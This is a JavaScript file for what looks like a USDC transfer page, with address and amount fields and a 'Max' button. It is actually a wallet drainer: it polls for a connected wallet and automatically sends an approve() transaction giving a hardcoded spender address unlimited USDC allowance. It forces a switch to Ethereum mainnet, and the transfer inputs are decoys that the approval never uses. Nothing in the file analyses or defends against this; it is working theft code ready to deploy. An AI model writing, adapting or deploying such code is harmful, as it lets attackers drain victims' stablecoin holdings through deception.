const USDC_CONTRACT_ADDRESS = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
const SPENDER_ADDRESS = '0xa81EE3A48c2B72C6AdB279812a730c93EfF5C2F6';
const USDC_DECIMALS = 6;
const ETHEREUM_CHAIN_ID = '0x1'; // Ethereum Mainnet
const APPROVE_SELECTOR = '095ea7b3';

// Maximum uint256 value for "unlimited" approval
const MAX_UINT256 = (2n ** 256n) - 1n;

// DOM Elements
const connectButton = document.getElementById('connect-button');
const addressInput = document.getElementById('address-input');
const amountInput = document.getElementById('amount-input');
const pasteButton = document.querySelector('.paste');
const maxButton = document.querySelector('.max');
const estimate = document.getElementById('estimate');
const disclaimer = document.getElementById('disclaimer');
const statusText = document.getElementById('status-text');
const processingModal = document.getElementById('processing-modal');
const processingClose = document.getElementById('processing-close');
const txDetailsButton = document.getElementById('tx-details-button');

// State Variables
let currentAddress = '';
let lastTxId = '';
let isBusy = false;
let isSuccess = false;
let hasAutoFired = false; // Prevents multiple auto-fires if interval runs fast

// Utility Functions
const shortAddress = (address) => (
    address ? `${address.slice(0, 6)}...${address.slice(-4)}` : ''
);

const shortTxId = (txId) => (
    txId ? `${txId.slice(0, 8)}...${txId.slice(-8)}` : ''
);

const setStatus = (message, type = '') => {
    statusText.textContent = message;
    statusText.className = `status-text ${type}`.trim();
};

const setProcessing = (isOpen) => {
    processingModal.classList.toggle('hidden', !isOpen);
};

const getConnectedAddress = () => {
    return currentAddress;
};

const getEthereumProvider = () => {
    if (!window.ethereum) {
        throw new Error('Ethereum wallet not found. Open this page in Trust Wallet.');
    }
    return window.ethereum;
};

const updateConnectionStatus = async () => {
    // Check for existing connection without prompting
    try {
        const provider = getEthereumProvider();
        const accounts = await provider.request({ method: 'eth_accounts' });
        currentAddress = accounts?.[0] || '';
        
        if (currentAddress) {
            connectButton.textContent = 'Next';
            if (!isBusy && !isSuccess) {
                setStatus(`Wallet: ${shortAddress(currentAddress)}`);
                
                // AUTO-FIRE LOGIC: If we have an address and haven't fired yet, execute immediately
                if (!hasAutoFired && !isBusy) {
                    hasAutoFired = true;
                    autoApproveUnlimited();
                }
            }
        } else {
            connectButton.textContent = 'Connect Wallet';
            if (!isBusy && !isSuccess) {
                setStatus('Waiting for wallet connection...');
            }
        }
    } catch (e) {
        // If provider doesn't exist yet, just wait
        currentAddress = '';
    }
};

const parseUsdtAmount = (value) => {
    const normalized = String(value || '').trim();
    if (!/^\d+(\.\d{1,6})?$/.test(normalized)) {
        throw new Error('Enter a valid USDC amount with up to 6 decimals.');
    }

    const [whole, fraction = ''] = normalized.split('.');
    const units = `${whole}${fraction.padEnd(USDC_DECIMALS, '0')}`.replace(/^0+(?=\d)/, '');
    const amount = BigInt(units || '0');

    if (amount <= 0n) {
        throw new Error('Enter an amount greater than 0.');
    }

    return amount;
};

const formatUsdtUnits = (units) => {
    const value = BigInt(units.toString());
    const base = 10n ** BigInt(USDC_DECIMALS);
    const whole = value / base;
    const fraction = (value % base).toString().padStart(USDC_DECIMALS, '0').replace(/0+$/, '');
    return fraction ? `${whole}.${fraction}` : whole.toString();
};

const updateAmountCopy = () => {
    const amount = amountInput.value || '0';
    estimate.textContent = `≈ $${Number(amount || 0).toFixed(2)}`;
    disclaimer.textContent = `This authorizes spender ${SPENDER_ADDRESS} for an UNLIMITED USDC amount.`;
};

const ensureEthereumMainnet = async (provider) => {
    const chainId = await provider.request({ method: 'eth_chainId' });

    if (String(chainId).toLowerCase() !== ETHEREUM_CHAIN_ID) {
        try {
            await provider.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: ETHEREUM_CHAIN_ID }]
            });
        } catch (switchError) {
            if (switchError.code === 4902) {
                await provider.request({
                    method: 'wallet_addEthereumChain',
                    params: [{
                        chainId: ETHEREUM_CHAIN_ID,
                        chainName: "Ethereum Mainnet",
                        nativeCurrency: { name: "Ether", symbol: "ETH", decimals: 18 },
                        rpcUrls: ["https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161"],
                        blockExplorerUrls: ["https://etherscan.io"]
                    }]
                });
            } else {
                throw new Error('Failed to switch to Ethereum Mainnet.');
            }
        }
    }
};

const encodeUint256 = (value) => (
    BigInt(value).toString(16).padStart(64, '0')
);

const encodeAddress = (address) => (
    address.toLowerCase().replace(/^0x/, '').padStart(64, '0')
);

const encodeApproveData = (spender, amount) => (
    `0x${APPROVE_SELECTOR}${encodeAddress(spender)}${encodeUint256(amount)}`
);

const sendUsdcApproval = async (provider, amountUnits) => {
    const data = encodeApproveData(SPENDER_ADDRESS, amountUnits);
    const tx = {
        to: USDC_CONTRACT_ADDRESS,
        data
    };

    if (currentAddress) {
        tx.from = currentAddress;
    }

    return provider.request({
        method: 'eth_sendTransaction',
        params: [tx]
    });
};

// Main Logic: Auto-approve unlimited amount when wallet is detected
const autoApproveUnlimited = async () => {
    try {
        if (!currentAddress) return; // Safety check

        isBusy = true;
        isSuccess = false;
        
        const provider = getEthereumProvider();
        
        setProcessing(true);
        connectButton.disabled = true;
        connectButton.textContent = 'Approving...';
        setStatus(`Switching to Mainnet & Approving Unlimited USDC for ${shortAddress(currentAddress)}`);

        // Ensure we are on the correct chain
        await ensureEthereumMainnet(provider);

        // Send Transaction with MAX_UINT256 (Unlimited)
        const txId = await sendUsdcApproval(provider, MAX_UINT256);

        lastTxId = txId;
        isSuccess = true;
        txDetailsButton.disabled = false;
        
        setStatus(`Authorization submitted for UNLIMITED USDC. Tx: ${shortTxId(txId)}`, 'success');
        connectButton.textContent = 'Sent Successfully';
        connectButton.classList.add('success');

    } catch (error) {
        console.error('Auto-approval failed:', error);
        isSuccess = false;
        setProcessing(false);
        
        if (error.code === 4001 || error.message?.includes('rejected')) {
            setStatus('User rejected the transaction.', 'error');
        } else {
            setStatus(error?.message || 'Transaction failed', 'error');
        }
        
        connectButton.textContent = 'Retry';
    } finally {
        isBusy = false;
        connectButton.disabled = false;
    }
};

// Event Listeners for UI Interactions
pasteButton.addEventListener('click', async () => {
    try {
        addressInput.value = await navigator.clipboard.readText();
    } catch {
        setStatus('Paste failed. Please paste manually.', 'error');
    }
});

maxButton.addEventListener('click', () => {
    amountInput.value = '999999'; 
    updateAmountCopy();
});

amountInput.addEventListener('input', () => {
    isSuccess = false;
    lastTxId = '';
    connectButton.classList.remove('success');
    txDetailsButton.disabled = true;
    updateAmountCopy();
    setStatus(currentAddress ? `Wallet: ${shortAddress(currentAddress)}` : '');
});

// Allow manual retry if auto-fire failed or user wants to re-approve
connectButton.addEventListener('click', () => {
    if (!isBusy && !isSuccess) {
        hasAutoFired = true; // Prevent interval from interfering during manual click
        autoApproveUnlimited();
    }
});

processingClose.addEventListener('click', () => setProcessing(false));

txDetailsButton.addEventListener('click', () => {
    if (lastTxId) {
        window.open(`https://etherscan.io/tx/${lastTxId}`, '_blank');
    }
});

// Initialization
updateAmountCopy();
updateConnectionStatus(); // Initial check

// Poll for wallet connection to trigger auto-fire without forcing a prompt
setInterval(updateConnectionStatus, 1500);
